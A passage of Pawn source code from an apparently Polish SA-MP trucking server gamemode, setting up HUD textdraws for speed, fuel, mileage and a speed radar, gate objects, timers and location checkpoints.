		TextDrawSetShadow(useboxp, 0);
		TextDrawSetOutline(useboxp, 0);
		TextDrawFont(useboxp, 0);

		predkosc[i] = TextDrawCreate(451.0, 257.600036, "Predkosc: 0 km/h");
		TextDrawLetterSize(predkosc[i], 0.449999, 1.600000);
		TextDrawAlignment(predkosc[i], 1);
		TextDrawColor(predkosc[i], -1);
		TextDrawSetShadow(predkosc[i], 3);
		TextDrawSetOutline(predkosc[i], 0);
		TextDrawBackgroundColor(predkosc[i], 51);
		TextDrawFont(predkosc[i], 1);
		TextDrawSetProportional(predkosc[i], 1);

		paliwotd[i] = TextDrawCreate(451.0, 282.239959, "Paliwo: IIIIIIII");
		TextDrawLetterSize(paliwotd[i], 0.449999, 1.600000);
		TextDrawAlignment(paliwotd[i], 1);
		TextDrawColor(paliwotd[i], -1);
		TextDrawSetShadow(paliwotd[i], 3);
		TextDrawSetOutline(paliwotd[i], 0);
		TextDrawBackgroundColor(paliwotd[i], 51);
		TextDrawFont(paliwotd[i], 1);
		TextDrawSetProportional(paliwotd[i], 1);

		przebiegtd[i] = TextDrawCreate(451.0, 301.653320, "Przebieg: 0.00 km");
		TextDrawLetterSize(przebiegtd[i], 0.449999, 1.600000);
		TextDrawAlignment(przebiegtd[i], 1);
		TextDrawColor(przebiegtd[i], -1);
		TextDrawSetShadow(przebiegtd[i], 3);
		TextDrawSetOutline(przebiegtd[i], 0);
		TextDrawBackgroundColor(przebiegtd[i], 51);
		TextDrawFont(przebiegtd[i], 1);
		TextDrawSetProportional(przebiegtd[i], 1);

		towartd[i] = TextDrawCreate(410.399749, 333.759918, "");
		TextDrawLetterSize(towartd[i], 0.449999, 1.600000);
		TextDrawAlignment(towartd[i], 1);
		TextDrawColor(towartd[i], -1);
		TextDrawSetShadow(towartd[i], 0);
		TextDrawSetOutline(towartd[i], 1);
		TextDrawBackgroundColor(towartd[i], 51);
		TextDrawFont(towartd[i], 1);
		TextDrawSetProportional(towartd[i], 1);

		*/


		useboxp = TextDrawCreate(633.250000, 344.500000, "usebox");
		TextDrawLetterSize(useboxp, 0.000000, 9.470368);
		TextDrawTextSize(useboxp, 489.250000, 0.000000);
		TextDrawAlignment(useboxp, 1);
		TextDrawColor(useboxp, 0);
		TextDrawUseBox(useboxp, true);
		TextDrawBoxColor(useboxp, 102);
		TextDrawSetShadow(useboxp, 0);
		TextDrawSetOutline(useboxp, 0);
		TextDrawFont(useboxp, 3);


		useboxp2 = TextDrawCreate(633.250000, 302.500000, "usebox");
		TextDrawLetterSize(useboxp2, 0.000000, 4.155555);
		TextDrawTextSize(useboxp2, 507.375000, 0.000000);
		TextDrawAlignment(useboxp2, 1);
		TextDrawColor(useboxp2, 0);
		TextDrawUseBox(useboxp2, true);
		TextDrawBoxColor(useboxp2, 102);
		TextDrawSetShadow(useboxp2, 0);
		TextDrawSetOutline(useboxp2, 0);
		TextDrawFont(useboxp2, 3);

		for(new i=0; i < GetMaxPlayers(); i++)
		{
			/*useboxuser[i] = TextDrawCreate(2.000000, 432.326660, "usebox");
			TextDrawLetterSize(useboxuser[i], 0.000000, 1.508518);
			TextDrawTextSize(useboxuser[i], 637.199951, 0.000000);
			TextDrawAlignment(useboxuser[i], 1);
			TextDrawColor(useboxuser[i], 1);
			TextDrawUseBox(useboxuser[i], true);
			TextDrawBoxColor(useboxuser[i], 102);
			TextDrawSetShadow(useboxuser[i], 0);
			TextDrawSetOutline(useboxuser[i], 0);
			TextDrawBackgroundColor(useboxuser[i], 168430090);
			TextDrawFont(useboxuser[i], 0);
			
			pasekuser[i] = TextDrawCreate(11.200009, 431.573333, "Zaloguj sie!");
			TextDrawLetterSize(pasekuser[i], 0.343599, 1.234133);
			TextDrawAlignment(pasekuser[i], 1);
			TextDrawColor(pasekuser[i], 8388863);
			TextDrawSetShadow(pasekuser[i], 0);
			TextDrawSetOutline(pasekuser[i], 0);
			TextDrawBackgroundColor(pasekuser[i], 51);
			TextDrawFont(pasekuser[i], 1);
			TextDrawSetProportional(pasekuser[i], 1);*/

			useboxuser[i] = TextDrawCreate(995.750000, 434.333465, "usebox");
			TextDrawLetterSize(useboxuser[i], 0.000000, 1.218055);
			TextDrawTextSize(useboxuser[i], -3.250000, 0.000000);
			TextDrawAlignment(useboxuser[i], 1);
			TextDrawColor(useboxuser[i], 0);
			TextDrawUseBox(useboxuser[i], true);
			TextDrawBoxColor(useboxuser[i], 102);
			TextDrawSetShadow(useboxuser[i], 0);
			TextDrawSetOutline(useboxuser[i], 0);
			TextDrawFont(useboxuser[i], 0);

			pasekuser[i] = TextDrawCreate(5.625000, 435.166595, "Zaloguj sie do gry... Panel: pwtruck.pl Forum: forum.pwtruck.pl");
			TextDrawLetterSize(pasekuser[i],  0.270000, 1.100000);
			TextDrawAlignment(pasekuser[i], 1);
			TextDrawColor(pasekuser[i], -1);
			TextDrawSetShadow(pasekuser[i], 0);
			TextDrawSetOutline(pasekuser[i], -1);
			TextDrawBackgroundColor(pasekuser[i], 51);
			TextDrawFont(pasekuser[i], 1);
			TextDrawSetProportional(pasekuser[i], 1);


			pasekuserinfo[i] = TextDrawCreate(633.750000, 1.166824, "");
			TextDrawLetterSize(pasekuserinfo[i], 0.406874, 1.360832);
			TextDrawAlignment(pasekuserinfo[i], 3);
			TextDrawColor(pasekuserinfo[i], -1);
			TextDrawSetShadow(pasekuserinfo[i], 0);
			TextDrawSetOutline(pasekuserinfo[i], 1);
			TextDrawBackgroundColor(pasekuserinfo[i], 51);
			TextDrawFont(pasekuserinfo[i], 1);
			TextDrawSetProportional(pasekuserinfo[i], 1);







			/*predkosc[i] = TextDrawCreate(498.400085, 356.906585, "~r~Predkosc:~w~ Odpal silnik");
			TextDrawLetterSize(predkosc[i], 0.358799, 1.316265);
			TextDrawAlignment(predkosc[i], 1);
			TextDrawColor(predkosc[i], -1);
			TextDrawSetShadow(predkosc[i], 0);
			TextDrawSetOutline(predkosc[i], 1);
			TextDrawBackgroundColor(predkosc[i], 51);
			TextDrawFont(predkosc[i], 1);
			TextDrawSetProportional(predkosc[i], 1);

			przebiegtd[i] = TextDrawCreate(498.399902, 371.093322, "~r~Przebieg:~w~ Odpal Silnik");
			TextDrawLetterSize(przebiegtd[i], 0.358799, 1.316265);
			TextDrawAlignment(przebiegtd[i], 1);
			TextDrawColor(przebiegtd[i], -1);
			TextDrawSetShadow(przebiegtd[i], 0);
			TextDrawSetOutline(przebiegtd[i], 1);
			TextDrawBackgroundColor(przebiegtd[i], 51);
			TextDrawFont(przebiegtd[i], 1);
			TextDrawSetProportional(przebiegtd[i], 1);

			paliwotd[i] = TextDrawCreate(498.399780, 385.280029, "~r~Paliwo: ~w~ Odpal silnik");
			TextDrawLetterSize(paliwotd[i], 0.358799, 1.316265);
			TextDrawAlignment(paliwotd[i], 1);
			TextDrawColor(paliwotd[i], -1);
			TextDrawSetShadow(paliwotd[i], 0);
			TextDrawSetOutline(paliwotd[i], 1);
			TextDrawBackgroundColor(paliwotd[i], 51);
			TextDrawFont(paliwotd[i], 1);
			TextDrawSetProportional(paliwotd[i], 1);

			towartd[i] = TextDrawCreate(498.400054, 400.960083, "");
			TextDrawLetterSize(towartd[i], 0.246800, 1.375998);
			TextDrawAlignment(towartd[i], 1);
			TextDrawColor(towartd[i], 0xDE1F2AFF);
			TextDrawSetShadow(towartd[i], 0);
			TextDrawSetOutline(towartd[i], 1);
			TextDrawBackgroundColor(towartd[i], 51);
			TextDrawFont(towartd[i], 1);
			TextDrawSetProportional(towartd[i], 1);*/


			/*predkosc[i] = TextDrawCreate(508.750000, 366.916717, "~r~Predkosc: ~w~ .. km/h");
			TextDrawLetterSize(predkosc[i], 0.338748, 1.378332);
			TextDrawAlignment(predkosc[i], 1);
			TextDrawColor(predkosc[i], -1);
			TextDrawSetShadow(predkosc[i], 0);
			TextDrawSetOutline(predkosc[i], 1);
			TextDrawBackgroundColor(predkosc[i], 51);
			TextDrawFont(predkosc[i], 1);
			TextDrawSetProportional(predkosc[i], 1);

			silniktd[i] = TextDrawCreate(567.500000, 342.416625, "~r~Silnik: ~w~..");
			TextDrawLetterSize(silniktd[i], 0.338748, 1.378332);
			TextDrawAlignment(silniktd[i], 2);
			TextDrawColor(silniktd[i], -1);
			TextDrawSetShadow(silniktd[i], 0);
			TextDrawSetOutline(silniktd[i], 1);
			TextDrawBackgroundColor(silniktd[i], 51);
			TextDrawFont(silniktd[i], 1);
			TextDrawSetProportional(silniktd[i], 1);
// Copyright (c) 2014-2015 KapiziaK
			przebiegtd[i] = TextDrawCreate(508.750000, 379.166595, "~r~Przebieg: ~w~.. km");
			TextDrawLetterSize(przebiegtd[i], 0.338748, 1.378332);
			TextDrawAlignment(przebiegtd[i], 1);
			TextDrawColor(przebiegtd[i], -1);
			TextDrawSetShadow(przebiegtd[i], 0);
			TextDrawSetOutline(przebiegtd[i], 1);
			TextDrawBackgroundColor(przebiegtd[i], 51);
			TextDrawFont(przebiegtd[i], 1);
			TextDrawSetProportional(przebiegtd[i], 1);

			paliwotd[i] = TextDrawCreate(508.750000, 393.166870, "~r~Paliwo: ~w~.. L");
			TextDrawLetterSize(paliwotd[i], 0.338748, 1.378332);
			TextDrawAlignment(paliwotd[i], 1);
			TextDrawColor(paliwotd[i], -1);
			TextDrawSetShadow(paliwotd[i], 0);
			TextDrawSetOutline(paliwotd[i], 1);
			TextDrawBackgroundColor(paliwotd[i], 51);
			TextDrawFont(paliwotd[i], 1);
			TextDrawSetProportional(paliwotd[i], 1);

			towartd[i] = TextDrawCreate(637.500000, 414.166564, "");
			TextDrawLetterSize(towartd[i], 0.338748, 1.378332);
			TextDrawAlignment(towartd[i], 3);
			TextDrawColor(towartd[i], -1);
			TextDrawSetShadow(towartd[i], 0);
			TextDrawSetOutline(towartd[i], 1);
			TextDrawBackgroundColor(towartd[i], 51);
			TextDrawFont(towartd[i], 1);
			TextDrawSetProportional(towartd[i], 1);*/

/*
	TextDrawLetterSize(boxtime, 0.000000, -2.971481);
	TextDrawTextSize(boxtime, 636.399902, 0.000000);
	TextDrawAlignment(boxtime, 1);
	TextDrawColor(boxtime, -1);
	TextDrawUseBox(boxtime, true);
	TextDrawBoxColor(boxtime, 673720360);
	TextDrawSetShadow(boxtime, 0);
	TextDrawSetOutline(boxtime, 0);
	TextDrawBackgroundColor(boxtime, 168430090);
	TextDrawFont(boxtime, 0);
*/


			predkosc[i] = TextDrawCreate(505.000000, 355.833312, "~r~Predkosc:~w~ 548 km/h");
			TextDrawLetterSize(predkosc[i], 0.270000, 1.100000);
			TextDrawTextSize(predkosc[i], 618.125000, 9.916665);
			TextDrawAlignment(predkosc[i], 1);
			TextDrawColor(predkosc[i], -1);
			TextDrawUseBox(predkosc[i], true);
			TextDrawBoxColor(predkosc[i], 69);
			TextDrawSetShadow(predkosc[i], 0);
			TextDrawSetOutline(predkosc[i], 1);
			TextDrawBackgroundColor(predkosc[i], 51);
			TextDrawFont(predkosc[i], 1);
			TextDrawSetProportional(predkosc[i], 1);



			silniktd[i] = TextDrawCreate(518.125000, 308.583312, "~r~Silnik:~w~ ON");
			TextDrawLetterSize(silniktd[i], 0.270000, 1.100000);
			TextDrawTextSize(silniktd[i], 623.750000, 46.083339);
			TextDrawAlignment(silniktd[i], 1);
			TextDrawColor(silniktd[i], -1);
			TextDrawUseBox(silniktd[i], true);
			TextDrawBoxColor(silniktd[i], 45);
			TextDrawSetShadow(silniktd[i], 0);
			TextDrawSetOutline(silniktd[i], 1);
			TextDrawBackgroundColor(silniktd[i], 51);
			TextDrawFont(silniktd[i], 1);
			TextDrawSetProportional(silniktd[i], 1);

			przebiegtd[i] = TextDrawCreate(505.000000, 371.583679, "~r~Przebieg:~w~ 58448.32 km");
			TextDrawLetterSize(przebiegtd[i], 0.270000, 1.100000);
			TextDrawTextSize(przebiegtd[i], 618.125000, 23.333332);
			TextDrawAlignment(przebiegtd[i], 1);
			TextDrawColor(przebiegtd[i], -1);
			TextDrawUseBox(przebiegtd[i], true);
			TextDrawBoxColor(przebiegtd[i], 69);
			TextDrawSetShadow(przebiegtd[i], 0);
			TextDrawSetOutline(przebiegtd[i], 1);
			TextDrawBackgroundColor(przebiegtd[i], 51);
			TextDrawFont(przebiegtd[i], 1);
			TextDrawSetProportional(przebiegtd[i], 1);



			paliwotd[i] = TextDrawCreate(505.000000, 387.333404, "~r~Paliwo:~w~ 350 L");
			TextDrawLetterSize(paliwotd[i], 0.270000, 1.100000);
			TextDrawTextSize(paliwotd[i], 618.125000, 51.333328);
			TextDrawAlignment(paliwotd[i], 1);
			TextDrawColor(paliwotd[i], -1);
			TextDrawUseBox(paliwotd[i], true);
			TextDrawBoxColor(paliwotd[i], 69);
			TextDrawSetShadow(paliwotd[i], 0);
			TextDrawSetOutline(paliwotd[i], 1);
			TextDrawBackgroundColor(paliwotd[i], 51);
			TextDrawFont(paliwotd[i], 1);
			TextDrawSetProportional(paliwotd[i], 1);


			towartd[i] = TextDrawCreate(505.000000, 403.666839, "");
			TextDrawLetterSize(towartd[i], 0.270000, 1.100000);
			TextDrawTextSize(towartd[i], 618.125000, 1.166666);
			TextDrawAlignment(towartd[i], 1);
			TextDrawColor(towartd[i], -1);
			TextDrawUseBox(towartd[i], true);
			TextDrawBoxColor(towartd[i], 69);
			TextDrawSetShadow(towartd[i], 0);
			TextDrawSetOutline(towartd[i], 1);
			TextDrawBackgroundColor(towartd[i], 51);
			TextDrawFont(towartd[i], 1);
			TextDrawSetProportional(towartd[i], 1);


			olejtd[i] = TextDrawCreate(518.125000, 324.333496, "~r~Olej: ~w~ l l l l l l l l l l");
			TextDrawLetterSize(olejtd[i], 0.270000, 1.100000);
			TextDrawTextSize(olejtd[i], 623.750000, 35.583332);
			TextDrawAlignment(olejtd[i], 1);
			TextDrawColor(olejtd[i], -1);
			TextDrawUseBox(olejtd[i], true);
			TextDrawBoxColor(olejtd[i], 45);
			TextDrawSetShadow(olejtd[i], 0);
			TextDrawSetOutline(olejtd[i], 1);
			TextDrawBackgroundColor(olejtd[i], 51);
			TextDrawFont(olejtd[i], 1);
			TextDrawSetProportional(olejtd[i], 1);

			namevehtd[i] = TextDrawCreate(566.250000, 338.916717, "ROAD TRAIN");
			TextDrawLetterSize(namevehtd[i], 0.270000, 1.100000);
			TextDrawAlignment(namevehtd[i], 2);
			TextDrawColor(namevehtd[i], -1);
			TextDrawSetShadow(namevehtd[i], 0);
			TextDrawSetOutline(namevehtd[i], 1);
			TextDrawBackgroundColor(namevehtd[i], 51);
			TextDrawFont(namevehtd[i], 2);
			TextDrawSetProportional(namevehtd[i], 1);


 		// --------------------------------------------------------------







			SuszarkaInfo[i] = TextDrawCreate(14.400000, 294.186553, "Suszarka:");
			TextDrawLetterSize(SuszarkaInfo[i], 0.374800, 1.166932);
			TextDrawAlignment(SuszarkaInfo[i], 1);
			TextDrawColor(SuszarkaInfo[i], -1);
			TextDrawSetShadow(SuszarkaInfo[i], 0);
			TextDrawSetOutline(SuszarkaInfo[i], 1);
			TextDrawBackgroundColor(SuszarkaInfo[i], 51);
			TextDrawFont(SuszarkaInfo[i], 1);
			TextDrawSetProportional(SuszarkaInfo[i], 1);

			SuszarkaVeh[i] = TextDrawCreate(14.399995, 303.146636, "Pojazd: ~r~Nie wykryto");
			TextDrawLetterSize(SuszarkaVeh[i], 0.348399, 1.226666);
			TextDrawAlignment(SuszarkaVeh[i], 1);
			TextDrawColor(SuszarkaVeh[i], -1);
			TextDrawSetShadow(SuszarkaVeh[i], 0);
			TextDrawSetOutline(SuszarkaVeh[i], 1);
			TextDrawBackgroundColor(SuszarkaVeh[i], 51);
			TextDrawFont(SuszarkaVeh[i], 1);
			TextDrawSetProportional(SuszarkaVeh[i], 1);

			SuszarkaSpeed[i] = TextDrawCreate(14.400001, 312.853271, "Predkosc: ~g~Nie wykryto~b~ km/h");
			TextDrawLetterSize(SuszarkaSpeed[i], 0.370799, 1.189333);
			TextDrawAlignment(SuszarkaSpeed[i], 1);
			TextDrawColor(SuszarkaSpeed[i], -1);
			TextDrawSetShadow(SuszarkaSpeed[i], 0);
			TextDrawSetOutline(SuszarkaSpeed[i], 1);
			TextDrawBackgroundColor(SuszarkaSpeed[i], 51);
			TextDrawFont(SuszarkaSpeed[i], 1);
			TextDrawSetProportional(SuszarkaSpeed[i], 1);

			SuszarkaPlayer[i] = TextDrawCreate(12.800003, 323.306640, "Gracz: Nie wykryto!");
			TextDrawLetterSize(SuszarkaPlayer[i], 0.366799, 1.338666);
			TextDrawAlignment(SuszarkaPlayer[i], 1);
			TextDrawColor(SuszarkaPlayer[i], -1);
			TextDrawSetShadow(SuszarkaPlayer[i], 0);
			TextDrawSetOutline(SuszarkaPlayer[i], 1);
			TextDrawBackgroundColor(SuszarkaPlayer[i], 51);
			TextDrawFont(SuszarkaPlayer[i], 1);
			TextDrawSetProportional(SuszarkaPlayer[i], 1);




		}


		timetd = TextDrawCreate(548.0, 24.0, "--:--");
		TextDrawLetterSize(timetd, 0.4, 1.2);
		TextDrawColor(timetd, 0xFFFFFFFF);
		TextDrawSetShadow(timetd, 0);
		TextDrawSetOutline(timetd, 1);
		TextDrawFont(timetd, 3);

		SetTimer("timeupdate",1000,true);
		SetTimer("zapiszpojazdy",1*60000,true);
		SetTimer("ChangeAdvTextdrawText", (1000*60), true);
		SetTimer("bonusmc", (60000), true);
		SetTimer("bonuspd", (60000), true);

		EnableStuntBonusForAll(0);





		// OBIEKTY

		// BRAMY
		//CreateObject(980,15.2000000,110.7000000,4.9000000,0.0000000,0.0000000,56.0000000); //object(airportgate) (1)
		//CreateObject(980,-72.5000000,-133.5000000,4.9000000,0.0000000,0.0000000,256.0000000); //object(airportgate) (2)


		bramataxi = CreateObject(980,349.1000100,-1786.0000000,7.1000000,0.0000000,0.0000000,0.0000000);
		bramarico1 = CreateObject(980,-1528.4000000,483.2000100,9.1000000,0.0000000,0.0000000,0.0000000);
		bramarico2 = CreateObject(980,-72.5000000,-133.5000000,4.9000000,0.0000000,0.0000000,256.0000000);
		bramamc = CreateObject(980,1948.3000000,2404.8000000,12.6000000,0.0000000,0.0000000,180.0000000);
		bramaet = CreateObject(980,-2864.3999000,469.7000100,6.6000000,0.0000000,0.0000000,269.2500000); //object(airportgate) (1) ET
		bramapd = CreateObject(980,-128.1000100,-179.3999900,3.7000000,0.0000000,0.0000000,350.0000000); //object(airportgate) (1) <object id="object (airportgate) (1)" breakable="true" interior="0" alpha="255" model="980" doublesided="false" scale="1" dimension="0" posX="-128.10001" posY="-179.39999" posZ="3.7" rotX="0" rotY="0" rotZ="350"></object>
		bramapoli = CreateObject(980,1527.0000000,665.2000100,12.4000000,0.0000000,0.0000000,0.0000000);
		bramapoli2 = CreateObject(980,1447.4000000,664.5000000,12.4000000,0.0000000,0.0000000,0.0000000);
		/*
		CreateDynamicObject(980,1527.0000000,665.2000100,12.4000000,0.0000000,0.0000000,0.0000000); //bra_close
CreateDynamicObject(980,1447.4000000,664.5000000,12.4000000,0.0000000,0.0000000,0.0000000); //bra_close
*/
		bramavip = CreateObject(980,2167.6001000,984.2999900,12.6000000,0.0000000,0.0000000,180.0000000);
		bramkadolv = CreateObject(969,1729.7000000,464.3999900,29.4000000,0.0000000,0.0000000,160.0000000);
		bramkadols = CreateObject(969,1710.9000000,479.2999900,29.2000000,0.0000000,0.0000000,340.0000000);
		osiedle = CreateObject(980,-1172.3000000,-988.4000200,131.1000100,0.0000000,0.0000000,90.0000000);
		bazaadm = CreateObject(980,1523.4000000,2773.2000000,12.4000000,0.0000000,0.0000000,272.0000000);
		bramate = CreateObject(980,2827.1001000,1381.1000000,12.5000000,0.0000000,0.0000000,0.0000000); //object(airportgate) (1)
		bramacruzz = CreateObject(980,1002.5000000,-644.0999800,122.7000000,0.0000000,0.0000000,24.0000000); //object(airportgate) (1)
		bramapks = CreateObject(980,1397.4000000,2694.3000000,12.6000000,0.0000000,0.0000000,270.0000000); //object(airportgate) (1)
		BramaMango1 = CreateObject(980,664.9000200,-1308.8000000,15.2000000,0.0000000,0.0000000,0.0000000); //bra_close
		BramaMango2 = CreateObject(980,660.4000200,-1227.6000000,17.6000000,0.0000000,0.0000000,60.0000000); //bra_close
		BramaMango3 = CreateObject(980,784.7999900,-1152.5000000,25.3000000,0.0000000,0.0000000,92.0000000); //bra_close
		bramaDziadu = CreateObject(980,263.132232,-1333.603515,54.035530,0.000000,0.000000,36.799999);
		BramaPrzedek = CreateObject(980,-504.7999900,2592.7000000,55.2000000,0.0000000,0.0000000,270.0000000);


		bramapenl = CreateObject(969, 197.89999, -316.79999, 0.9, 0, 0, 272.494);
		bramapenl2 = CreateObject(980, 83.59961, -221, 3.3, 0, 0, 357.995);

		bramalotnisko1 = CreateObject(971,87.0000000,-199.0000000,6.4000000,0.0000000,0.0000000,1.5000000);
		bramalotnisko2 = CreateObject(980,-45.2998000,-138.4003900,5.4000000,0.0000000,0.0000000,261.9960000);


		// --
		//#undef GGKAPIZIAK
		//#define GGKAPIZIAK "39831273"

		SendRconCommand("weather "DEFAULTWEATHER"");

		#if CONVERT_MODE 1

		Convert(FILE_MAP_NAME);

		#endif




		return printf("[server] Public OnGameModeInit zostal wczytany!");
	}


	forward zapiszpojazdy();
	public zapiszpojazdy()
	{
		SaveVehicles();
		SaveOrders();

		return 1;
	}







	forward markery();
	public markery()
	{
		for(new i=0, p=GetMaxPlayers(); i<p; i++)
		{
			if(IsPlayerConnected(i))
			{
				if(PlayerToPoint(100.0,i,markery_cords[0][0],markery_cords[0][1],markery_cords[0][2])) {//LV Magazyny
					SetPlayerCheckpoint(i, markery_cords[0][0],markery_cords[0][1],markery_cords[0][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[1][0],markery_cords[1][1],markery_cords[1][2])) {//LV lot
					SetPlayerCheckpoint(i, markery_cords[1][0],markery_cords[1][1],markery_cords[1][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[2][0],markery_cords[2][1],markery_cords[2][2])) {//Baza vip
					SetPlayerCheckpoint(i, markery_cords[2][0],markery_cords[2][1],markery_cords[2][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[3][0],markery_cords[3][1],markery_cords[3][2])) {//LV Budowa
					SetPlayerCheckpoint(i, markery_cords[3][0],markery_cords[3][1],markery_cords[3][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[4][0],markery_cords[4][1],markery_cords[4][2])) {//LV Kopalnia
					SetPlayerCheckpoint(i, markery_cords[4][0],markery_cords[4][1],markery_cords[4][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[5][0],markery_cords[5][1],markery_cords[5][2])) {//LV Elektrownia
					SetPlayerCheckpoint(i, markery_cords[5][0],markery_cords[5][1],markery_cords[5][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[6][0],markery_cords[6][1],markery_cords[6][2])) {//LV Magazyn CT
					SetPlayerCheckpoint(i, markery_cords[6][0],markery_cords[6][1],markery_cords[6][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[7][0],markery_cords[7][1],markery_cords[7][2])) {//LV Centrum
					SetPlayerCheckpoint(i, markery_cords[7][0],markery_cords[7][1],markery_cords[7][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[8][0],markery_cords[8][1],markery_cords[8][2])) {//SF Wysypisko
					SetPlayerCheckpoint(i, markery_cords[8][0],markery_cords[8][1],markery_cords[8][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[9][0],markery_cords[9][1],markery_cords[9][2])) {//SF Chilla
					SetPlayerCheckpoint(i, markery_cords[9][0],markery_cords[9][1],markery_cords[9][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[10][0],markery_cords[10][1],markery_cords[10][2])) {//LS Molo
					SetPlayerCheckpoint(i, markery_cords[10][0],markery_cords[10][1],markery_cords[10][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[11][0],markery_cords[11][1],markery_cords[11][2])) {//LS Lot
					SetPlayerCheckpoint(i, markery_cords[11][0],markery_cords[11][1],markery_cords[11][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[12][0],markery_cords[12][1],markery_cords[12][2])) {//LS Grovestreet
					SetPlayerCheckpoint(i, markery_cords[12][0],markery_cords[12][1],markery_cords[12][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[13][0],markery_cords[13][1],markery_cords[13][2])) {//SF Lot
					SetPlayerCheckpoint(i, markery_cords[13][0],markery_cords[13][1],markery_cords[13][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[14][0],markery_cords[14][1],markery_cords[14][2])) {//SF Stocznia
					SetPlayerCheckpoint(i, markery_cords[14][0],markery_cords[14][1],markery_cords[14][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[15][0],markery_cords[15][1],markery_cords[15][2])) {//SF Budowa
					SetPlayerCheckpoint(i, markery_cords[15][0],markery_cords[15][1],markery_cords[15][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[16][0],markery_cords[16][1],markery_cords[16][2])) {//SF Doki Wojskowe
					SetPlayerCheckpoint(i, markery_cords[16][0],markery_cords[16][1],markery_cords[16][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[17][0],markery_cords[17][1],markery_cords[17][2])) {//RS Haul
					SetPlayerCheckpoint(i, markery_cords[17][0],markery_cords[17][1],markery_cords[17][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[18][0],markery_cords[18][1],markery_cords[18][2])) {//LS Komisariat
					SetPlayerCheckpoint(i, markery_cords[18][0],markery_cords[18][1],markery_cords[18][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[19][0],markery_cords[19][1],markery_cords[19][2])) {//LS Browarownia
					SetPlayerCheckpoint(i, markery_cords[19][0],markery_cords[19][1],markery_cords[19][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[20][0],markery_cords[20][1],markery_cords[20][2])) {//LV Maly Port
					SetPlayerCheckpoint(i, markery_cords[20][0],markery_cords[20][1],markery_cords[20][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[21][0],markery_cords[21][1],markery_cords[21][2])) {//SF Klasztor
					SetPlayerCheckpoint(i, markery_cords[21][0],markery_cords[21][1],markery_cords[21][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[22][0],markery_cords[22][1],markery_cords[22][2])) {//SF Fabryka
					SetPlayerCheckpoint(i, markery_cords[22][0],markery_cords[22][1],markery_cords[22][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[23][0],markery_cords[23][1],markery_cords[23][2])) {//SF Tartak
					SetPlayerCheckpoint(i, markery_cords[23][0],markery_cords[23][1],markery_cords[23][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[24][0],markery_cords[24][1],markery_cords[24][2])) {//LV Kurczak
					SetPlayerCheckpoint(i, markery_cords[24][0],markery_cords[24][1],markery_cords[24][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[25][0],markery_cords[25][1],markery_cords[25][2])) {//LV Baza Wojskowa
					SetPlayerCheckpoint(i, markery_cords[25][0],markery_cords[25][1],markery_cords[25][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[26][0],markery_cords[26][1],markery_cords[26][2])) {//LV Truckstop
					SetPlayerCheckpoint(i, markery_cords[26][0],markery_cords[26][1],markery_cords[26][2], 14.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[27][0],markery_cords[27][1],markery_cords[27][2])) {//LV Biuro PD
					SetPlayerCheckpoint(i, markery_cords[27][0],markery_cords[27][1],markery_cords[27][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[28][0],markery_cords[28][1],markery_cords[28][2])) {//LS Stacja Gassow
					SetPlayerCheckpoint(i, markery_cords[28][0],markery_cords[28][1],markery_cords[28][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[29][0],markery_cords[29][1],markery_cords[29][2])) {//LS Corporate Wood
					SetPlayerCheckpoint(i, markery_cords[29][0],markery_cords[29][1],markery_cords[29][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[30][0],markery_cords[30][1],markery_cords[30][2])) {//Colombian Villa
					SetPlayerCheckpoint(i, markery_cords[30][0],markery_cords[30][1],markery_cords[30][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[31][0],markery_cords[31][1],markery_cords[31][2])) {//SF Korty Tenisowe
					SetPlayerCheckpoint(i, markery_cords[31][0],markery_cords[31][1],markery_cords[31][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[32][0],markery_cords[32][1],markery_cords[32][2])) {//LS Osiedle
					SetPlayerCheckpoint(i, markery_cords[32][0],markery_cords[32][1],markery_cords[32][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[33][0],markery_cords[33][1],markery_cords[33][2])) {//SF Szopa Cruzzera
					SetPlayerCheckpoint(i, markery_cords[33][0],markery_cords[33][1],markery_cords[33][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[34][0],markery_cords[34][1],markery_cords[34][2])) {//SF Pole
					SetPlayerCheckpoint(i, markery_cords[34][0],markery_cords[34][1],markery_cords[34][2], 12.5);
					}else if(PlayerToPoint(100.0,i,markery_cords[35][0],markery_cords[35][1],markery_cords[35][2])) {//LV Zajazd Pod Kurczakiem
					SetPlayerCheckpoint(i, markery_cords[35][0],markery_cords[35][1],markery_cords[35][2], 12.5);
					}else{
					DisablePlayerCheckpoint(i);
				}
			}
		}
		return 1;
	}



	forward timeupdate();
	public timeupdate()
	{
		new godz,minu,sekund;
		gettime(godz,minu,sekund);
		new query[180];
